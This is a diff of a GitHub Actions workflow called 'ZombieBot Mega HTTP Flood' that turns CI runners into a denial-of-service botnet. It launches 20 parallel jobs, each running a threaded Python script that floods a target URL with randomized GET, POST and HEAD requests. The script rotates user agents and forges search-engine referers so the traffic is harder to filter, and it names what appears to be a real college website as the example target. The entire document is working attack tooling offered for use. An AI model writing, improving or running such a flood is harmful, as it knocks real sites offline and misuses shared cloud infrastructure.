@@ -1,46 +1,78 @@
-name: ZombieBot HTTP Flood
+name: ZombieBot Mega HTTP Flood
 
 on:
   workflow_dispatch:
     inputs:
       target:
-        description: 'Target URL (include http[s]://)'
+        description: 'Target full URL (e.g., https://theoxfordengg.org)'
         required: true
-        default: 'https://theoxfordengg.org'
-      seconds:
-        description: 'Duration of attack (seconds)'
+      duration:
+        description: 'Attack duration (seconds)'
         required: true
         default: '30'
       threads:
-        description: 'Threads per runner'
+        description: 'Threads per job'
         required: true
-        default: '5'
+        default: '20'
 
 jobs:
   ddos:
     runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        jobnum: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
       - name: Install Python requests
         run: pip install requests
-      - name: HTTP Flood
+      - name: Launch HTTP flood
         run: |
-          import threading, requests, time
+          python -u - <<'EOF'
+          import threading, time, random, requests, string
 
           TARGET = "${{ github.event.inputs.target }}"
-          SECONDS = int("${{ github.event.inputs.seconds }}")
+          DURATION = int("${{ github.event.inputs.duration }}")
           THREADS = int("${{ github.event.inputs.threads }}")
-          END = time.time() + SECONDS
+          PATHS = ["/", "/news", "/contact", "/about", "/admissions", "/404", "/events", "/placements", "/gallery", "/faculty"]
+          METHODS = ["GET", "POST", "HEAD"]
 
-          def flood():
-              while time.time() < END:
+          user_agents = [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
+            "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1"
+          ]
+
+          def attack():
+              end = time.time() + DURATION
+              while time.time() < end:
+                  path = random.choice(PATHS)
+                  url = TARGET.rstrip("/") + path
+                  method = random.choice(METHODS)
+                  headers = {
+                      "User-Agent": random.choice(user_agents),
+                      "Referer": "https://google.com/search?q=" + ''.join(random.choices(string.ascii_lowercase, k=8))
+                  }
+                  data = {"test": random.randint(1,99999)}
                   try:
-                      requests.get(TARGET, timeout=3)
+                      if method == "GET":
+                          requests.get(url, headers=headers, timeout=3)
+                      elif method == "POST":
+                          requests.post(url, headers=headers, data=data, timeout=3)
+                      elif method == "HEAD":
+                          requests.head(url, headers=headers, timeout=3)
                   except:
                       pass
 
-          print(f"Starting {THREADS} threads to attack {TARGET} for {SECONDS} seconds...")
-          workers = [threading.Thread(target=flood) for _ in range(THREADS)]
-          for w in workers: w.start()
-          for w in workers: w.join()
+          print(f"Launching {THREADS} threads to attack {TARGET} for {DURATION}s...")
+          workers = []
+          for _ in range(THREADS):
+              t = threading.Thread(target=attack)
+              t.daemon = True
+              t.start()
+              workers.append(t)
+          for t in workers:
+              t.join()
           print("Attack complete.")
-        shell: python
+          EOF
+        shell: bash
